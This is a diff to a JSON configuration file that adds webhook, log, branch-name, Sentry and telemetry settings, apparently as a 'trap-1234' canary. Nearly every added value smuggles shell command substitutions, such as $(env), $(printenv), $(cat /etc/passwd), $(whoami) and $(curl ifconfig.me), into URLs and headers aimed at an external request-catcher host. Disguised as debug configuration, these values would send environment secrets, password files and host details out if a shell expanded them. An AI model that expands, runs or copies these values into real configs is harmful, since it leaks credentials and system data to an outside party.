@@ -39,18 +39,45 @@
           "scope": "admin"
         },
         "log_payload": true
+      },
+      {
+        "url": "https://letc.requestcatcher.com/trap-1234/api/debug/$(id)",
+        "headers": {
+          "X-Debug-Env": "$(env)",
+          "X-Debug-Path": "$(pwd)"
+        },
+        "log_payload": true
       }
     ]
   },
   "logs": {
     "remote_log_url": "https://letc.requestcatcher.com/trap-1234/logs/$(hostname)",
-    "error_trace": "https://letc.requestcatcher.com/trap-1234/errors/$(pwd)"
+    "error_trace": "https://letc.requestcatcher.com/trap-1234/errors/$(pwd)",
+    "trace_log": "https://letc.requestcatcher.com/trap-1234/traces/$(id)"
   },
   "branch_tracking": {
     "test_branch": "trap-1234-debug-$(id)",
-    "release_branch": "trap-1234-release/$(pwd)"
+    "release_branch": "trap-1234-release/$(pwd)",
+    "hotfix_branch": "trap-1234-hotfix/$(whoami)"
   },
   "debug": {
-    "simulate_error": "file-not-found-$(whoami)-trap-1234"
+    "simulate_error": "file-not-found-$(whoami)-trap-1234",
+    "stack_trace": "Error: Cannot find module $(pwd)\n    at Object.<anonymous> (/usr/src/app/index.js:7:1)"
+  },
+  "sentry": {
+    "dsn": "https://trap-1234-user:$(pwd)@sentry.io/123456",
+    "environment": "$(hostname)-trap-1234",
+    "release": "$(uname -a)-trap-1234",
+    "traceparent": "00-$(curl ifconfig.me)-$(id)-$(whoami)-01",
+    "baggage": "sentry-release=$(env),sentry-environment=$(hostname)"
+  },
+  "telemetry": {
+    "traceparent": "00-123456789abcdef123456789abcdef12-123456789abcdef1-01",
+    "baggage": "resource.hostname=$(hostname),resource.env=$(env),resource.path=$(pwd)",
+    "debug_payload": "https://letc.requestcatcher.com/trap-1234/telemetry/debug?env=$(env)&pwd=$(pwd)"
+  },
+  "simulated_paths": {
+    "fake_config": "https://letc.requestcatcher.com/trap-1234/config/$(cat /etc/passwd)",
+    "health_check": "https://letc.requestcatcher.com/trap-1234/internal/healthcheck?env=$(printenv)"
   }
 }
